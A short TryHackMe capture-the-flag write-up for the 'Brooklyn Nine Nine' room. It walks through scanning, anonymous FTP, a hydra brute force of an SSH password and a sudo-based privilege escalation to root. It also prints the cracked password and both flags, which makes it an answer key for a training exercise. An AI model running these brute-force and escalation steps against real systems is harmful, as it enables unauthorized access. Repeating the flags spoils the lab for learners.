# TryHackMe - Brooklyn Nine Nine

## Challenge Information

| Property | Value |
|----------|-------|
| **Difficulty** | Easy |
| **Category** | Linux |
| **Link** | https://tryhackme.com/room/brooklynninenine |

## Overview 
This challenge focuses on Red Teaming and privilege escalation techniques. Participants must perform reconnaissance, exploit vulnerabilities, and escalate privileges to gain root access on a Linux system.

## Task 1: This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.

### Approach to the challenge 

nmap -sC -sV <MACHINE_IP> for open ports.
-> Happens to know that it has username as anonymous and no password for the ftp connection

gobuster dir -u http://<MACHINE_IP> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt.(Nothing interesting)

ftp <MACHINE_IP>
-> There is the note_to_jake.txt file, after donwloading into the local machine and viewing the file, there is this message that, note to jake

get note_to_jake.txt

-> Using hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<MACHINE_IP> -V to get the password for jake

password: 987654321

ssh into the machine and get the user flag.
flag1: ee11cbb19052e40b07aac0ca060c23ee

run sud0 -l for checking the user privilages, we found the previlage escalation

sudo less /etc/profile
#!/bin/sh

you got the root access

redirect to /root directory and get the root flag
flag2: 63a9f0ea7bb98050796b649e85481845